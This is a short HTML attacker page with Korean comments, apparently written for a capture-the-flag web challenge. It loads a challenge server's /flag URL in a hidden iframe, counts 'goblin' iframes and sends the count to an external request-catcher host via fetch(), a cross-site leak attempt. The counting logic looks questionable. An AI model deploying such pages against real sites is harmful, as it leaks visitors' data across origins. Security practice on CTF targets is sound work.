<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Goblin Iframe Counter</title>
</head>
<body>
    <h1>Goblin Iframe Counterㅌ</h1>
    <script>
        const requestUrl = 'http://war.sschall.xyz:60001/flag';

        const checkGoblinIframes = () => {
            // iframe 생성
            const iframe = document.createElement('iframe');
            iframe.src = requestUrl;
            iframe.style.display = 'none'; // iframe을 화면에 보이지 않게 설정
            document.body.appendChild(iframe);

            // iframe이 로드된 후 goblin iframe 개수를 체크
            iframe.onload = () => {
                const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
                const goblinCount = goblinIframes.length;

                // 최종 요청 보내기
                const finalRequestUrl = `https://hxfqwbg.request.dreamhack.games?count=${goblinCount}`;
                fetch(finalRequestUrl).then(() => {
                    console.log(`Final request sent with goblin count: ${goblinCount}`);
                });
            };
        };

        checkGoblinIframes();
    </script>
</body>
</html>
